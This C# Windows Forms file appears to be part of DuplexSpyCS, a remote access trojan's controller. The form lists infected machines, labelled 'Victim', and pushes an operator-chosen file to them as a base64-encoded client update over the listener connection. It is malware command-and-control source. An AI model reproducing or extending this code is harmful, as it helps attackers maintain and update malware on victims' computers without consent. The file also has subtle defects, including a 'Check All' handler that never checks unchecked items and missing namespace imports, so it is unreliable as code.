using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmClntUpdate : Form
    {
        public List<Victim> m_lsVictim;
        public Form1 frmMain;

        public frmClntUpdate()
        {
            InitializeComponent();
        }

        void Received(Listener listener, Victim v, string[] cmd)
        {

            if (cmd[0] == "clnt")
            {
                if (cmd[1] == "ud") //Update
                {
                    int nCode = int.Parse(cmd[2]);
                    Invoke(new Action(() =>
                    {
                        ListViewItem item = listView1.FindItemWithText(v.ID);
                        
                        if (item != null)
                            item.SubItems[1].Text = nCode == 1 ? "OK" : Crypto.b64D2Str(cmd[3]);
                    }));
                }
            }
        }

        void setup()
        {
            if (m_lsVictim == null)
            {

                Close();
                return;
            }

            foreach (Victim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;

                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";

            frmMain.listener.ReceivedDecoded += Received;
        }

        private void frmClntUpdate_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Check All
        private void button1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.CheckedItems)
                item.Checked = true;
        }
        //Uncheck All
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.CheckedItems)
                item.Checked = false;
        }
        //GO
        private void button3_Click(object sender, EventArgs e)
        {
            string szFileName = textBox1.Text;
            if (!File.Exists(szFileName))
            {
                MessageBox.Show("Cannot find file: " + szFileName, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            byte[] abBuffer = File.ReadAllBytes(szFileName);

            int nThd = (int)numericUpDown1.Value;
            int nCode = checkBox1.Checked ? 1 : 0;
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThd, nThd);
            foreach (ListViewItem item in listView1.CheckedItems)
            {
                Victim v = (Victim)item.Tag;
                ThreadPool.QueueUserWorkItem(x =>
                {
                    v.SendCommand($"clnt|ud|{nCode}|{Crypto.b64E2Str(Path.GetFileName(szFileName))}|" + Convert.ToBase64String(abBuffer));
                });
            }
        }

        private void frmClntUpdate_FormClosed(object sender, FormClosedEventArgs e)
        {
            frmMain.listener.ReceivedDecoded -= Received;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = ofd.FileName;
            }
        }
    }
}